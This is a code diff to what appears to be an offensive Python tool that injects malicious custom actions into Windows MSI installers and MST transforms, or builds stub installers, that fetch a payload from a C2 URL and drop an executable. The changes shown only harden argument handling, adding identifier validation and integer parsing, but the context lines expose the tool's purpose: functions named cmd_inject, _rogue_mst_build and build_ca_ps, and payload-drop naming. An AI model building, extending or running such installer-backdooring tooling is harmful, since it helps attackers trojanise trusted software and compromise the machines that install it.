@@ -2,6 +2,7 @@
 
 import sys
 import os
+import re
 import base64
 import uuid
 import shutil
@@ -83,12 +84,23 @@ def gen_guid():
     return "{" + str(uuid.uuid4()).upper() + "}"
 
 def gen_name(n=6):
-    """Generate a random alphanumeric identifier for CA action/property names."""
-    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=n))
+    """Generate a random alphanumeric identifier, letter-first (MSI CHAR(72) safe)."""
+    first = random.choice(string.ascii_uppercase)
+    rest  = ''.join(random.choices(string.ascii_uppercase + string.digits, k=n - 1))
+    return first + rest
 
 def gen_drop_name():
     """Generate a random EXE filename for cmd-mode payload drop."""
     return ''.join(random.choices(string.ascii_lowercase, k=random.randint(6, 10))) + '.exe'
+
+def _validate_msi_identifier(value, field, max_len=None):
+    if not isinstance(value, str) or not value:
+        raise ValueError(f"{field} must be a non-empty string")
+    if any(ch in value for ch in ("'", "\r", "\n", "\x00")):
+        raise ValueError(f"{field} contains unsafe characters")
+    if max_len is not None and len(value) > max_len:
+        raise ValueError(f"{field} exceeds MSI limit ({max_len})")
+    return value
 
 def check_deps_linux(tools):
     """Verify required Linux tools are present before attempting operations."""
@@ -98,6 +110,15 @@ def check_deps_linux(tools):
         print(f"    Install: sudo apt install msitools wixl")
         return False
     return True
+
+def validate_msi_identifier(value, field_name, max_len=72):
+    """Validate MSI identifier names: letter-start, alphanumeric+underscore, max CHAR(72)."""
+    if len(value) > max_len:
+        print(f"[!] {field_name} '{value[:20]}...' exceeds MSI CHAR({max_len}) limit ({len(value)} chars)")
+        sys.exit(1)
+    if not re.match(r'^[A-Za-z][A-Za-z0-9_]*$', value):
+        print(f"[!] {field_name} must start with a letter and contain only [A-Za-z0-9_]")
+        sys.exit(1)
 
 def build_ca_ps(url, drop_name=None):
     if drop_name is None:
@@ -222,6 +243,8 @@ def _inject_linux(target, output, exe_args, exe_path='C:\\Windows\\System32\\cmd
         action_name = gen_name()
     if prop_name is None:
         prop_name = gen_name()
+    action_name = _validate_msi_identifier(action_name, 'action_name', max_len=72)
+    prop_name = _validate_msi_identifier(prop_name, 'prop_name', max_len=72)
     shutil.copy(target, output)
     prod_code = _randomize_guids_linux(output)
     print()
@@ -461,6 +484,8 @@ def cmd_inject(args):
         print(f"[!] Target not found: {target}"); return
     if action_name is None: action_name = gen_name()
     if prop_name is None:   prop_name   = gen_name()
+    validate_msi_identifier(action_name, '--action-name')
+    validate_msi_identifier(prop_name,   '--property-name')
     print(f"[*] Target : {target}")
     print(f"[*] C2 URL : {c2_url}")
     print(f"[*] Output : {output}")
@@ -503,7 +528,12 @@ def _parse_inject_args(args):
         elif rest[i] == '--mode' and i+1 < len(rest):        mode = rest[i+1]; i += 2
         elif rest[i] == '--action-name' and i+1 < len(rest): action_name = rest[i+1]; i += 2
         elif rest[i] == '--property-name' and i+1 < len(rest): prop_name = rest[i+1]; i += 2
-        elif rest[i] == '--sequence' and i+1 < len(rest):    seq_num = int(rest[i+1]); i += 2
+        elif rest[i] == '--sequence' and i+1 < len(rest):
+            try:
+                seq_num = int(rest[i+1])
+            except ValueError:
+                print(f"[!] --sequence must be an integer, got: {rest[i+1]}"); sys.exit(1)
+            i += 2
         elif rest[i] == '--drop-name' and i+1 < len(rest):   drop_name = rest[i+1]; i += 2
         elif rest[i] in ('-h', '--help'): return 'help'
         else: i += 1
@@ -542,6 +572,8 @@ def _rogue_mst_build(original, output, c2_url, mode="ps",
         print(f"[!] File not found: {original}"); return False
     if action_name is None: action_name = gen_name()
     if prop_name is None:   prop_name   = gen_name()
+    validate_msi_identifier(action_name, '--action-name')
+    validate_msi_identifier(prop_name,   '--property-name')
     original = os.path.abspath(original)
     output   = os.path.abspath(output)
     print(f"[*] Original : {original}")
@@ -721,7 +753,12 @@ def _parse_mst_build_args(args):
         elif rest[i] == '--mode' and i+1 < len(rest):         mode = rest[i+1]; i += 2
         elif rest[i] == '--action-name' and i+1 < len(rest):  action_name = rest[i+1]; i += 2
         elif rest[i] == '--property-name' and i+1 < len(rest):prop_name = rest[i+1]; i += 2
-        elif rest[i] == '--sequence' and i+1 < len(rest):     seq_num = int(rest[i+1]); i += 2
+        elif rest[i] == '--sequence' and i+1 < len(rest):
+            try:
+                seq_num = int(rest[i+1])
+            except ValueError:
+                print(f"[!] --sequence must be an integer, got: {rest[i+1]}"); sys.exit(1)
+            i += 2
         elif rest[i] == '--drop-name' and i+1 < len(rest):    drop_name = rest[i+1]; i += 2
         elif rest[i] in ('-h', '--help'): return 'help'
         else: i += 1
@@ -768,6 +805,8 @@ def _stub_linux(c2_url, mode, name, manufacturer, version, output, exe_args,
                 prod_guid, upg_guid, comp_guid, action_name='WU', prop_name='CMDEXE', seq_num=1510):
     if not check_deps_linux(['wixl', 'msibuild', 'msiinfo']):
         return False
+    action_name = _validate_msi_identifier(action_name, 'action_name', max_len=72)
+    prop_name = _validate_msi_identifier(prop_name, 'prop_name', max_len=72)
     exe_path = 'C:\\Windows\\System32\\cmd.exe'
     wxs = f"""<?xml version="1.0" encoding="UTF-8"?>
 <Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
@@ -948,6 +987,8 @@ def cmd_stub(args):
     c2_url, mode, name, manufacturer, version, output, action_name, prop_name, seq_num, drop_name = parsed
     if action_name is None: action_name = gen_name()
     if prop_name is None:   prop_name   = gen_name()
+    validate_msi_identifier(action_name, '--action-name')
+    validate_msi_identifier(prop_name,   '--property-name')
     print(f"[*] C2 URL      : {c2_url}")
     print(f"[*] Mode        : {mode}")
     print(f"[*] Name        : {name}")
@@ -998,7 +1039,12 @@ def _parse_stub_args(args):
         elif a in ('-o', '--output') and i+1 < len(args): output = args[i+1]; i += 2
         elif a == '--action-name' and i+1 < len(args):  action_name = args[i+1]; i += 2
         elif a == '--property-name' and i+1 < len(args):prop_name = args[i+1]; i += 2
-        elif a == '--sequence' and i+1 < len(args):     seq_num = int(args[i+1]); i += 2
+        elif a == '--sequence' and i+1 < len(args):
+            try:
+                seq_num = int(args[i+1])
+            except ValueError:
+                print(f"[!] --sequence must be an integer, got: {args[i+1]}"); sys.exit(1)
+            i += 2; continue
         elif a == '--drop-name' and i+1 < len(args):    drop_name = args[i+1]; i += 2
         elif a in ('-h', '--help'): return 'help'
         else: i += 1
